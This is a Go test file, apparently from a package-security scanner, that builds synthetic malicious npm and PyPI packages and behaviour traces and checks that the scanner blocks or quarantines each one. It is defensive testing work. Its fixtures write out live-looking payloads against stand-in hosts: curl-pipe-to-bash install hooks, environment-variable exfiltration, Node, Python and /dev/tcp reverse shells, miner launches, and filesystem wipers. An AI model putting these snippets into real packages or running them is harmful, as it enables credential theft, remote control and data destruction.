// Package eval is a synthetic-technique regression corpus. Each case models a
// supply-chain technique observed in the wild — harmless by construction (fake
// hosts/IPs, no real payloads) — and asserts the pipeline's verdict. It is the
// deterministic, infra-free counterpart to the live-malware evaluation: it locks
// in detection coverage per technique and guards against regressions.
package eval

import (
	"encoding/base64"
	"encoding/json"
	"testing"

	"github.com/joncooper/detonator/internal/analyze/behavior"
	"github.com/joncooper/detonator/internal/engine"
	"github.com/joncooper/detonator/internal/score"
	"github.com/joncooper/detonator/internal/testutil"
	"github.com/joncooper/detonator/internal/verdict"
)

// traceJSON builds a one-phase behavior log.
func traceJSON(files []behavior.FileOp, socks []behavior.Socket, cmds []behavior.Command, dns []behavior.DNSRecord) []byte {
	tr := behavior.Trace{Analysis: map[string]behavior.Phase{
		"install": {Files: files, Sockets: socks, Commands: cmds, DNS: dns},
	}}
	b, _ := json.Marshal(tr)
	return b
}

func dnsQ(host string) behavior.DNSRecord {
	return behavior.DNSRecord{Queries: []behavior.DNSQuery{{Hostname: host, Types: []string{"A"}}}}
}

func b64(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }

type techCase struct {
	name      string // technique
	prevalent string // why it's in-scope (in-the-wild note)
	eco       verdict.Ecosystem
	tarball   []byte
	trace     []byte
	wantBlock bool // true: must be blocked; false: must be flagged (block OR quarantine)
	benign    bool // true: must be allowed
}

func TestSyntheticTechniqueCorpus(t *testing.T) {
	npm, pypi := verdict.NPM, verdict.PyPI

	cases := []techCase{
		// ---- static: source-visible payloads ----
		{
			name: "npm-postinstall-shell-download-exec", prevalent: "commodity npm stealer", eco: npm,
			tarball: testutil.NPMTarball(map[string]string{
				"package.json": `{"name":"x","scripts":{"postinstall":"curl https://fake-c2.example/s | bash"}}`,
			}),
			wantBlock: true,
		},
		{
			name: "obfuscated-eval-loader", prevalent: "eval(atob(...)) loaders", eco: npm,
			tarball: testutil.NPMTarball(map[string]string{
				"package.json": `{"name":"x"}`,
				"index.js":     "eval(Buffer.from('" + b64("console.log(1)") + "','base64').toString());",
			}),
			wantBlock: true, // dynamic-exec-decoded is critical
		},
		{
			name: "base64-encoded-c2-url", prevalent: "hidden endpoints", eco: pypi,
			tarball: testutil.PyPISdist("x-1.0", map[string]string{
				"x/client.py": "U = '" + b64("http://fake-c2.example/collect") + "'\n",
			}),
			wantBlock: false, // encoded-network-indicator is high -> quarantine
		},
		{
			name: "hardcoded-public-ip-c2", prevalent: "raw-IP exfil (strapi-class)", eco: npm,
			tarball: testutil.NPMTarball(map[string]string{
				"package.json": `{"name":"x","scripts":{"postinstall":"node p.js"}}`,
				"p.js":         "require('http').request({hostname:'45.77.0.1',port:9999});", // placeholder public IP, no connection
			}),
			wantBlock: false, // hardcoded-ip-endpoint high -> quarantine
		},
		{
			name: "pypi-setup-py-execution", prevalent: "sdist install-time code", eco: pypi,
			tarball: testutil.PyPISdist("x-1.0", map[string]string{
				"setup.py": "import subprocess,urllib.request\nsubprocess.run(['sh','-c','x'])\nurllib.request.urlopen('http://fake-c2.example')\nfrom setuptools import setup\nsetup(name='x')",
			}),
			wantBlock: true, // py-setup-execution with network -> critical
		},

		// ---- static: hardening rules (overnight gap-closure) ----
		{
			name: "npm-postinstall-env-stealer", prevalent: "install-hook env/CI-secret stealer (GuardDog npm-serialize-environment)", eco: npm,
			tarball: testutil.NPMTarball(map[string]string{
				"package.json": `{"name":"x","scripts":{"postinstall":"node collect.js"}}`,
				"collect.js":   "require('https').request('https://telemetry.fake-c2.example/i',{method:'POST'}).end(JSON.stringify(process.env));",
			}),
			wantBlock: true, // install-env-exfil critical (harvest is the postinstall target)
		},
		{
			name: "pypi-env-harvest-module", prevalent: "env exfil in runtime module (GuardDog pypi exfiltrate-sensitive-data)", eco: pypi,
			tarball: testutil.PyPISdist("x-1.0", map[string]string{
				"x/telemetry.py": "import os,urllib.request\nurllib.request.urlopen('http://telemetry.fake-c2.example', data=str(dict(os.environ)).encode())\n",
			}),
			wantBlock: false, // install-env-exfil high (runtime, not install-time) -> quarantine
		},
		{
			name: "npm-reverse-shell-source", prevalent: "RAT implant in package source (node net+child_process)", eco: npm,
			tarball: testutil.NPMTarball(map[string]string{
				"package.json": `{"name":"x"}`,
				"lib/conn.js":  "const s=require('net').connect(4444,'fake-c2.example');require('child_process').spawn('/bin/sh',[],{stdio:[s,s,s]});",
			}),
			wantBlock: true, // reverse-shell-source Tier B (socket fd bound to shell stdio)
		},
		{
			name: "pypi-reverse-shell-source", prevalent: "reverse shell in an importable module (socket+dup2+/bin/sh)", eco: pypi,
			tarball: testutil.PyPISdist("x-1.0", map[string]string{
				"x/net.py": "import os,socket,subprocess\ns=socket.socket();s.connect(('fake-c2.example',4444))\nos.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\nsubprocess.call(['/bin/sh','-i'])\n",
			}),
			wantBlock: true, // reverse-shell-source Tier B (python dup2->/bin/sh)
		},
		{
			name: "pypi-bundled-miner-config", prevalent: "bundled cryptominer config (stratum pool + wallet)", eco: pypi,
			tarball: testutil.PyPISdist("x-1.0", map[string]string{
				"x/miner_config.json": `{"url":"stratum+tcp://pool.fake-miner.example:3333","user":"48FakeWalletDoNotUse","algo":"randomx"}`,
				"x/__init__.py":       "x = 1\n",
			}),
			wantBlock: false, // cryptominer-artifact high -> quarantine
		},
		{
			name: "npm-bundled-xmrig-loader", prevalent: "xmrig loader (miner binary + config tokens)", eco: npm,
			tarball: testutil.NPMTarball(map[string]string{
				"package.json": `{"name":"x","scripts":{"postinstall":"node run.js"}}`,
				"run.js":       "const {spawn}=require('child_process');spawn('xmrig',['-o','pool.fake-miner.example:5555','--donate-level','1','--coin','monero']);",
			}),
			wantBlock: false, // cryptominer-artifact high -> quarantine
		},
		{
			name: "npm-postinstall-wiper", prevalent: "install-time sabotage / disgruntled-maintainer wiper", eco: npm,
			tarball: testutil.NPMTarball(map[string]string{
				"package.json": `{"name":"x","scripts":{"postinstall":"rm -rf --no-preserve-root / #wipe"}}`,
			}),
			wantBlock: true, // destructive-payload critical (install-hook context)
		},
		{
			name: "protestware-conditional-fs-wipe", prevalent: "protestware / logic-bomb (peacenotwar class)", eco: npm,
			tarball: testutil.NPMTarball(map[string]string{
				"package.json": `{"name":"x"}`,
				"index.js":     "if (new Date() > new Date('2030-01-01') && process.env.CI !== 'true') { require('fs').rmSync(require('os').homedir(), { recursive: true, force: true }); }",
			}),
			wantBlock: false, // destructive-payload high (general source, date-gated) -> quarantine
		},
		{
			name: "pypi-setup-rmtree-home", prevalent: "sdist install-time destruction", eco: pypi,
			tarball: testutil.PyPISdist("x-1.0", map[string]string{
				"setup.py": "import shutil, os\nshutil.rmtree(os.path.expanduser('~'))\nfrom setuptools import setup\nsetup(name='x')",
			}),
			wantBlock: true, // destructive-payload critical (setup.py context)
		},

		// ---- behavioral: runtime techniques (synthetic traces) ----
		{
			name: "cloud-metadata-theft", prevalent: "CI/cloud cred theft", eco: npm,
			trace:     traceJSON(nil, []behavior.Socket{{Address: "169.254.169.254", Port: 80}}, nil, nil),
			wantBlock: true,
		},
		{
			name: "credential-exfil-chain", prevalent: "read secret + phone home", eco: npm,
			trace: traceJSON(
				[]behavior.FileOp{{Path: "/root/.aws/credentials", Read: true}},
				nil, nil, []behavior.DNSRecord{dnsQ("exfil.fake-c2.example")}),
			wantBlock: true, // exfil-chain critical
		},
		{
			name: "webhook-exfil-slack", prevalent: "captured live: hooks.slack.com", eco: npm,
			trace:     traceJSON(nil, nil, nil, []behavior.DNSRecord{dnsQ("hooks.slack.com")}),
			wantBlock: false, // unknown-domain high -> quarantine
		},
		{
			name: "second-stage-from-github", prevalent: "captured live: codeload.github.com", eco: npm,
			trace:     traceJSON(nil, nil, nil, []behavior.DNSRecord{dnsQ("raw.githubusercontent.com")}),
			wantBlock: false,
		},
		{
			name: "reverse-shell-spawn", prevalent: "sh -c over network", eco: npm,
			trace: traceJSON(nil, nil,
				[]behavior.Command{{Command: []string{"sh", "-c", "curl https://fake-c2.example/x | bash"}}}, nil),
			wantBlock: false, // process-spawn (curl) high -> quarantine
		},
		{
			name: "dns-exfil-dynamic-c2", prevalent: "dynamic/tunnel C2 (trycloudflare)", eco: npm,
			trace:     traceJSON(nil, nil, nil, []behavior.DNSRecord{dnsQ("a1b2c3.attacker.fake-c2.example")}),
			wantBlock: false,
		},

		// ---- behavioral: new-class traits (Plan 3) ----
		{
			name: "persistence-cron", prevalent: "cron/systemd persistence", eco: npm,
			trace:     traceJSON([]behavior.FileOp{{Path: "/etc/cron.d/x", Write: true}}, nil, nil, nil),
			wantBlock: true,
		},
		{
			name: "reverse-shell", prevalent: "RAT/implant", eco: npm,
			trace: traceJSON(nil, nil,
				[]behavior.Command{{Command: []string{"bash", "-c", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"}}}, nil),
			wantBlock: true,
		},
		{
			name: "dropper-download-execute", prevalent: "second-stage dropper", eco: npm,
			trace: traceJSON([]behavior.FileOp{{Path: "/tmp/stage2", Write: true}}, nil,
				[]behavior.Command{{Command: []string{"sh", "-c", "/tmp/stage2"}}}, nil),
			wantBlock: true,
		},
		{
			name: "cryptominer", prevalent: "coinminer payload", eco: npm,
			trace:     traceJSON(nil, []behavior.Socket{{Address: "45.9.148.1", Port: 3333}}, nil, nil),
			wantBlock: false, // mining-pool-egress high -> quarantine
		},
		{
			name: "wiper-data-destruction", prevalent: "destructive/sabotage", eco: npm,
			trace: traceJSON(nil, nil,
				[]behavior.Command{{Command: []string{"sh", "-c", "rm -rf /root"}}}, nil),
			wantBlock: true,
		},
		{
			name: "dns-tunnel-exfil", prevalent: "DNS-tunnel exfil", eco: npm,
			trace: traceJSON(nil, nil, nil, []behavior.DNSRecord{{Queries: []behavior.DNSQuery{
				{Hostname: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1.exfil.example"},
				{Hostname: "MHhkZWFkYmVlZmNhZmViYWJlMDAx.exfil.example"},
				{Hostname: "cXdlcnR5dWlvcGFzZGZnaGprbHo.exfil.example"},
			}}}),
			wantBlock: false, // dns-exfil high -> quarantine
		},

		// ---- benign controls: must NOT be flagged ----
		{
			name: "benign-clean-npm", prevalent: "control", eco: npm, benign: true,
			tarball: testutil.NPMTarball(map[string]string{"package.json": `{"name":"ok"}`, "index.js": "module.exports=1;"}),
			trace:   traceJSON(nil, nil, nil, []behavior.DNSRecord{dnsQ("registry.npmjs.org")}),
		},
		{
			name: "benign-package-manager-noise", prevalent: "control: npm/pip/sandbox reads", eco: npm, benign: true,
			trace: traceJSON(
				[]behavior.FileOp{{Path: "/root/.npmrc", Read: true}, {Path: "/etc/passwd", Read: true}, {Path: "/etc/shadow", Read: true}},
				nil, []behavior.Command{{Command: []string{"sh", "-c", "node build.js"}}}, nil),
		},
		{
			// Precision guard for install-env-exfil: reading a SINGLE named env var
			// next to a network call is ubiquitous benign config and must NOT fire.
			name: "benign-single-env-var-read", prevalent: "control: dotenv/config lib", eco: npm, benign: true,
			tarball: testutil.NPMTarball(map[string]string{
				"package.json": `{"name":"ok"}`,
				"index.js":     "const mode=process.env.NODE_ENV;fetch('https://api.example/'+mode);module.exports=mode;",
			}),
		},
		{
			name: "benign-clean-pypi", prevalent: "control", eco: pypi, benign: true,
			tarball: testutil.Wheel(map[string]string{"ok/__init__.py": "x = 1\n"}),
			trace:   traceJSON(nil, nil, nil, []behavior.DNSRecord{dnsQ("files.pythonhosted.org")}),
		},
		{
			name: "benign-native-build", prevalent: "control: node-gyp/gcc compile", eco: npm, benign: true,
			trace: traceJSON(
				[]behavior.FileOp{{Path: "build/Release/foo.node", Write: true}, {Path: "/root/.npm/_cacache/tmp/x", Write: true}},
				nil,
				[]behavior.Command{{Command: []string{"node-gyp", "rebuild"}}, {Command: []string{"gcc", "-c", "binding.cc"}}, {Command: []string{"uname", "-s"}}},
				nil),
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			v := score.Score(score.Input{
				Artifact: verdict.Artifact{Ecosystem: c.eco, Name: "x", Version: "1.0.0"},
				Tarball:  c.tarball,
				Trace:    c.trace,
			}, engine.DefaultPolicy())

			switch {
			case c.benign:
				if v.Decision != verdict.Allow {
					t.Fatalf("benign %q -> %s (want allow): %s", c.name, v.Decision, v.Reason)
				}
			case c.wantBlock:
				if v.Decision != verdict.Block {
					t.Fatalf("%q -> %s (want block): %s", c.name, v.Decision, v.Reason)
				}
			default: // must be flagged: block or quarantine
				if v.Decision == verdict.Allow {
					t.Fatalf("%q -> allow (want flagged)", c.name)
				}
			}
		})
	}
}
